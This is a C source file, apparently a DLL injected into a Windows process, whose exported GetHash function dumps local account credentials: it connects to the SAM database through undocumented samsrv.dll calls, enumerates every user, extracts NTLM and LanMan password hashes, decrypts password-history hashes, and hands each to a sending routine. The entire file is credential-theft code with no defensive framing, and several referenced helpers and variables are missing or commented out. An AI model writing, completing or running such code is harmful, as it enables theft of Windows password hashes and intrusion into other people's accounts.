#include <stdio.h>
#include <windows.h>
#include <winnt.h>
#include <ntsecapi.h>

DECLARE_HANDLE(HUSER);
DECLARE_HANDLE(HSAM);
DECLARE_HANDLE(HDOMAIN);

typedef struct _sam_user_info
{
	DWORD rid;
	LSA_UNICODE_STRING name;
} SAM_USER_INFO;

typedef struct _sam_user_enum
{
	DWORD count;
	SAM_USER_INFO *users;
} SAM_USER_ENUM;

typedef struct _USERINFO
{
	char cHash[64];		// Stores NTLM and LanMan hash data
	char szUser[256];	// Stores the user's name
} USERINFO, *LPUSERINFO;

#define SAM_USER_INFO_PASSWORD_OWFS 0x12
#define SAM_HISTORY_COUNT_OFFSET 0x3c
#define SAM_HISTORY_NTLM_OFFSET 0x3c

// Samsrv functions
typedef NTSTATUS(WINAPI *SamIConnectFunc) (DWORD, HSAM*, DWORD, DWORD);
typedef NTSTATUS(WINAPI *SamrOpenDomainFunc) (HSAM, DWORD dwAccess, PSID, HDOMAIN*);
typedef NTSTATUS(WINAPI *SamrOpenUserFunc) (HDOMAIN, DWORD dwAccess, DWORD, HUSER*);
typedef NTSTATUS(WINAPI *SamrEnumerateUsersInDomainFunc) (HDOMAIN, DWORD*, DWORD, SAM_USER_ENUM**, DWORD, PVOID);
typedef NTSTATUS(WINAPI *SamrQueryInformationUserFunc) (HUSER, DWORD, PVOID);
typedef HLOCAL(WINAPI *SamIFree_SAMPR_USER_INFO_BUFFERFunc) (PVOID, DWORD);
typedef HLOCAL(WINAPI *SamIFree_SAMPR_ENUMERATION_BUUFERFunc) (SAM_USER_ENUM*);
typedef NTSTATUS(WINAPI *SamrCloseHandleFunc) (HANDLE*);
typedef NTSTATUS(WINAPI *SamIGetPrivateData_t) (HUSER, DWORD *, DWORD *, DWORD *, PVOID *);
typedef NTSTATUS(WINAPI *SystemFunction025_t) (PVOID, DWORD*, BYTE[32]);
typedef NTSTATUS(WINAPI *SystemFunction027_t) (PVOID, DWORD*, BYTE[32]);

//  Samsrv function pointers
static SamIConnectFunc pSamIConnect = NULL;
static SamrOpenDomainFunc pSamrOpenDomain = NULL;
static SamrOpenUserFunc pSamrOpenUser = NULL;
static SamrQueryInformationUserFunc pSamrQueryInformationUser = NULL;
static SamrEnumerateUsersInDomainFunc pSamrEnumerateUsersInDomain = NULL;
static SamIFree_SAMPR_USER_INFO_BUFFERFunc pSamIFree_SAMPR_USER_INFO_BUFFER = NULL;
static SamIFree_SAMPR_ENUMERATION_BUUFERFunc pSamIFree_SAMPR_ENUMERATION_BUFFER = NULL;
static SamrCloseHandleFunc pSamrCloseHandle = NULL;
static SamIGetPrivateData_t pSamIGetPrivateData = NULL;
static SystemFunction025_t pSystemFunction025 = NULL;
static SystemFunction027_t pSystemFunction027 = NULL;

static HINSTANCE hSamsrv;
static HINSTANCE hAdvapi32;

/*
static HANDLE hPipe = NULL;
static BOOL bDoHistoryDump = TRUE;
BYTE* pSecretKey = NULL;

BLOWFISH_CTX ctx;
*/



__declspec(dllexport) void __cdecl GetHash(LPCTSTR lpszPipeName, BYTE* pEncryptionKey, DWORD dwKeyLen, BOOL bSkipHistories) {
	
	//On charge les librairies
	hSamsrv = LoadLibrary(L"samsrv.dll");
	hAdvapi32 = LoadLibrary(L"advapi32.dll");

	pSamIConnect = (SamIConnectFunc)GetProcAddress(hSamsrv, "SamIConnect");
	pSamrOpenDomain = (SamrOpenDomainFunc)GetProcAddress(hSamsrv, "SamrOpenDomain");
	pSamrOpenUser = (SamrOpenUserFunc)GetProcAddress(hSamsrv, "SamrOpenUser");
	pSamrQueryInformationUser = (SamrQueryInformationUserFunc)GetProcAddress(hSamsrv, "SamrQueryInformationUser");
	pSamrEnumerateUsersInDomain = (SamrEnumerateUsersInDomainFunc)GetProcAddress(hSamsrv, "SamrEnumerateUsersInDomain");
	pSamIFree_SAMPR_USER_INFO_BUFFER = (SamIFree_SAMPR_USER_INFO_BUFFERFunc)GetProcAddress(hSamsrv, "SamIFree_SAMPR_USER_INFO_BUFFER");
	pSamIFree_SAMPR_ENUMERATION_BUFFER = (SamIFree_SAMPR_ENUMERATION_BUUFERFunc)GetProcAddress(hSamsrv, "SamIFree_SAMPR_ENUMERATION_BUFFER");
	pSamrCloseHandle = (SamrCloseHandleFunc)GetProcAddress(hSamsrv, "SamrCloseHandle");
	pSamIGetPrivateData = (SamIGetPrivateData_t)GetProcAddress(hSamsrv, "SamIGetPrivateData");
	pSystemFunction025 = (SystemFunction025_t)GetProcAddress(hAdvapi32, "SystemFunction025");
	pSystemFunction027 = (SystemFunction027_t)GetProcAddress(hAdvapi32, "SystemFunction027");


	

	if (!pSamIConnect || !pSamrOpenDomain || !pSamrOpenUser || !pSamrQueryInformationUser
		|| !pSamrEnumerateUsersInDomain || !pSamIFree_SAMPR_USER_INFO_BUFFER
		|| !pSamIFree_SAMPR_ENUMERATION_BUFFER || !pSamrCloseHandle || !pSamIGetPrivateData || !pSystemFunction025 || !pSystemFunction027)
	{
		//echec du chargement de librairie
		goto exit;
	}
	////////////////////////////////////////////////////////////////////////////////////////////
	LSA_OBJECT_ATTRIBUTES attributes;
	LSA_HANDLE hLsa = 0;
	PLSA_UNICODE_STRING pSysName = NULL;
	POLICY_ACCOUNT_DOMAIN_INFO* pDomainInfo;
	NTSTATUS rc, enumRc;
	HSAM hSam = 0;
	HDOMAIN hDomain = 0;
	HUSER hUser = 0;
	DWORD dwEnum = 0;
	DWORD dwNumber;
	SAM_USER_ENUM *pEnum = NULL;
	HINSTANCE hSamsrv = NULL;
	HINSTANCE hAdvapi32 = NULL;
	DWORD dataSize;
	int i;
	DWORD ret = 1;
	//////////////////////////////////////

	// Open the Policy database
	memset(&attributes, 0, sizeof(LSA_OBJECT_ATTRIBUTES));
	attributes.Length = sizeof(LSA_OBJECT_ATTRIBUTES);

	// Get policy handle
	rc = LsaOpenPolicy(pSysName, &attributes, POLICY_ALL_ACCESS, &hLsa);
	if (rc < 0)
	{
		//SendStatusMessage("Target: LsaOpenPolicy failed: 0x%08x", rc);
		//SendStatusMessage("Error 1: 0x%08x", rc);
		goto exit;
	}

	// Get Domain Info
	rc = LsaQueryInformationPolicy(hLsa, PolicyAccountDomainInformation, (void**)&pDomainInfo);
	if (rc < 0)
	{
		//SendStatusMessage("Target: LsaQueryInformationPolicy failed: 0x%08x", rc);
		//SendStatusMessage("Error 2: 0x%08x", rc);
		goto exit;
	}

	// Connect to the SAM database
	rc = pSamIConnect(0, &hSam, MAXIMUM_ALLOWED, 1);
	if (rc < 0)
	{
		//SendStatusMessage("Target: SamIConnect failed: 0x%08x", rc);
		//SendStatusMessage("Error 3: 0x%08x", rc);
		goto exit;
	}

	rc = pSamrOpenDomain(hSam, 0xf07ff, pDomainInfo->DomainSid, &hDomain);
	if (rc < 0)
	{
		//SendStatusMessage("Target: SamrOpenDomain failed: 0x%08x", rc);
		//SendStatusMessage("Error 4: 0x%08x", rc);
		hDomain = 0;
		goto exit;
	}


	do
	{
		enumRc = pSamrEnumerateUsersInDomain(hDomain, &dwEnum, 0, &pEnum, 1000, &dwNumber);
		if (enumRc == 0 || enumRc == 0x105)
		{
			for (i = 0; i < (int)dwNumber; i++)
			{
				WCHAR  szUserName[USER_BUFFER_LENGTH], szOrigUserName[USER_BUFFER_LENGTH];
				BYTE  hashData[64];
				DWORD dwSize;
				PVOID pHashData = 0, pHistRec = 0;
				DWORD dw1, dw2;
				DWORD dwCounter, dwOffset;
				int j;

				memset(szUserName, 0, USER_BUFFER_LENGTH);
				memset(szOrigUserName, 0, USER_BUFFER_LENGTH);
				memset(hashData, 0, 64);

				// Open the user (by Rid)
				rc = pSamrOpenUser(hDomain, MAXIMUM_ALLOWED, pEnum->users[i].rid, &hUser);
				if (rc < 0)
				{
					//SendStatusMessage("Target: SamrOpenUser failed: 0x%08x", rc);
					SendStatusMessage("Error 5: 0x%08x", rc);
					continue;
				}

				// Get the password OWFs
				rc = pSamrQueryInformationUser(hUser, SAM_USER_INFO_PASSWORD_OWFS, &pHashData);
				if (rc < 0)
				{
					//SendStatusMessage("Target: SamrQueryInformationUser failed: 0x%08x", rc);
					SendStatusMessage("Error 6: 0x%08x", rc);
					pSamrCloseHandle(&hUser);
					hUser = 0;
					continue;
				}

				// Convert the username and rid
				dwSize = min(USER_BUFFER_LENGTH, pEnum->users[i].name.Length >> 1);
				if (wcsncpy_s(szOrigUserName, sizeof(szOrigUserName) / sizeof(szOrigUserName[0]), pEnum->users[i].name.Buffer, dwSize) != 0)
					wcscpy(szOrigUserName, L"PwDumpError");
				if (_snwprintf_s(szUserName, sizeof(szUserName) / sizeof(szUserName[0]), sizeof(szUserName) / sizeof(szUserName[0]), L"%s:%d", szOrigUserName, pEnum->users[i].rid) <= 0)
					wcscpy(szUserName, L"PwDumpError:999999");

				// Send the user data
				memcpy(hashData, pHashData, 32);
				SendUserData(hashData, szUserName);

				// Free stuff
				pSamIFree_SAMPR_USER_INFO_BUFFER(pHashData, SAM_USER_INFO_PASSWORD_OWFS);
				pHashData = NULL;

				dw1 = 2;
				dw2 = 0;
				dwSize = 0;

				// Password history dump. Only do this if the functions are available to do it (Vista is different)
				if (bDoHistoryDump)
				{
					memset(hashData, 0, 64);
					rc = pSamIGetPrivateData(hUser, &dw1, &dw2, &dwSize, &pHashData);

					if (rc == 0 && dwSize > 0x3c)
					{
						pHistRec = pHashData;

						dwCounter = (((BYTE *)pHashData)[SAM_HISTORY_COUNT_OFFSET]) / 16;
						dwOffset = (((BYTE *)pHashData)[SAM_HISTORY_NTLM_OFFSET]);

						if ((dwCounter > 1) && (dwSize > dwOffset + 0x64))
						{
							for (j = dwCounter; j > 1; j--)
							{
								pHistRec = (BYTE*)pHistRec += 0x10;

								if (0 != (rc = pSystemFunction025((BYTE *)pHistRec + 0x44, &pEnum->users[i].rid, hashData)))
								{
									break;
								}

								if (0 != (rc = pSystemFunction027((BYTE *)pHistRec + 0x44 + dwOffset, &pEnum->users[i].rid, hashData + 16)))
								{
									break;
								}

								dataSize = 32;
								ZeroMemory(szUserName, sizeof(szUserName));
								if (_snwprintf_s(szUserName, sizeof(szUserName) / sizeof(szUserName[0]),
									sizeof(szUserName) / sizeof(szUserName[0]),
									L"%s_history_%d:%d", szOrigUserName, dwCounter - j, pEnum->users[i].rid) <= 0)
									wcscpy(szUserName, L"PwDumpError:999999");
								SendUserData(hashData, szUserName);
							}
						}

						if (pHashData)
							LocalFree(pHashData);

						pHashData = 0;
					}
				}

				pSamrCloseHandle(&hUser);
				hUser = 0;

			}
			pSamIFree_SAMPR_ENUMERATION_BUFFER(pEnum);
			pEnum = NULL;
		}
		else
		{
			//SendStatusMessage("Target: unable to enumerate domain users: 0x%08x", rc);
			SendStatusMessage("Error 7: 0x%08x", rc);
			goto exit;
		}
	} while (enumRc == 0x105);



exit:
	// Clean up
	

	if (hUser)
		pSamrCloseHandle(&hUser);
	if (hDomain)
		pSamrCloseHandle(&hDomain);
	if (hSam)
		pSamrCloseHandle(&hSam);
	if (hLsa)
		LsaClose(hLsa);

	if (hSamsrv)
		FreeLibrary(hSamsrv);
	if (hAdvapi32)
		FreeLibrary(hAdvapi32);

	return ;

}

















/*
BOOL SetPrivilege(HANDLE hToken, LPCTSTR Privilege, BOOL bEnablePrivilege)//source MSDN
{
	TOKEN_PRIVILEGES tp;
	LUID luid;
	TOKEN_PRIVILEGES tpPrevious;
	DWORD cbPrevious = sizeof(TOKEN_PRIVILEGES);

	if (!LookupPrivilegeValue(NULL, Privilege, &luid))
	{
		return FALSE;
	}

	//Get the current privilege setting
	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	tp.Privileges[0].Attributes = 0;

	if (AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), &tpPrevious, &cbPrevious))
	{
		//Now set the new privilege setting
		tpPrevious.PrivilegeCount = 1;
		tpPrevious.Privileges[0].Luid = luid;

		if (bEnablePrivilege)
		{
			tpPrevious.Privileges[0].Attributes |= (SE_PRIVILEGE_ENABLED);
		}
		else
		{
			tpPrevious.Privileges[0].Attributes ^= (SE_PRIVILEGE_ENABLED &  tpPrevious.Privileges[0].Attributes);
		}

		if (AdjustTokenPrivileges(hToken, FALSE, &tpPrevious, cbPrevious, NULL, NULL))
		{
			return TRUE;
		}
	}
	return FALSE;
}

int getDebugPrivilege()//source MSDN
{
	HANDLE currentProcess = GetCurrentProcess();
	HANDLE hToken;
	OpenProcessToken(currentProcess, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);

	if (SetPrivilege(hToken, SE_DEBUG_NAME, TRUE) == TRUE) {
		return TRUE;
	}
	return FALSE;
}*/